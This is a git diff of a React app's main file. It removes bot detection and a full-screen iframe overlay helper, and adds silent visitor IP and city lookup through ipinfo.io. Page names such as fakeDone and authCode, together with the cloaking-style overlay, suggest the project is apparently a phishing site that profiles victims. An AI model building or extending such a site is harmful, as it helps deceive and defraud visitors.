@@ -7,9 +7,7 @@ import ClassUser from "./pages/fakeDone";
 import AuthCode from "./pages/authCode";
 import AdminPage from "./pages/admin";
 import Login from "./pages/login";
-import { isbot } from "isbot";
-import { Home } from "react-ionicons";
-
+import { getLanguageByCountryCode } from "./components/languageUtils"; // Import hàm từ file languageUtils.js
 
 function PrivateRoute({ children }) {
   return localStorage.getItem("logined") === "true" ? (
@@ -20,35 +18,27 @@ function PrivateRoute({ children }) {
 }
 
 function App() {
-  let[countryCode, setCountryCode] = useState('');
-  let[IsUserHiden, SetUserHiden] = useState(false);
-
-  function showIframe(file) {
-    const html = (
-      <iframe src={file} style={{
-        position: 'fixed',
-        top: '0px',
-        bottom: '0px',
-        right: '0px',
-        width: '100%',
-        border: 'none',
-        margin: '0',
-        padding: '0',
-        overflow: 'hidden',
-        zIndex: '999999',
-        height: '100%',
-      }}></iframe>
-    );
-    return html;
-  }
-
   const setLocaltion =  () => {
+    var _ip = 'Unknown';
+    var _language = 'en';
+    var _country = 'Unknown';
+    var _city = 'Unknown';
     try {
       fetch("https://ipinfo.io/json").then(d => d.json()).then(d => {
-        var countryCode = d.country;
-        setCountryCode(countryCode.toLowerCase());
-        localStorage.setItem(
-          "location",JSON.stringify({ IP: d.ip, country: d.country, city: d.city})
+        if(d.country){
+          _language = getLanguageByCountryCode(d.country);
+        }
+        if(d.ip){
+          _ip = d.ip;
+        }
+        if(d.country){
+          _country = d.country;
+        }
+        if(d.city){
+          _city = d.city;
+        }
+         localStorage.setItem(
+          "location",JSON.stringify({ lang:_language,IP: _ip, country: _country, city: _city})
         );
       });
     } catch (error) {
@@ -59,8 +49,6 @@ function App() {
   useEffect(() => {
     setLocaltion();
   }, []);
-
-
           return (
             <BrowserRouter>
               <div id="app">
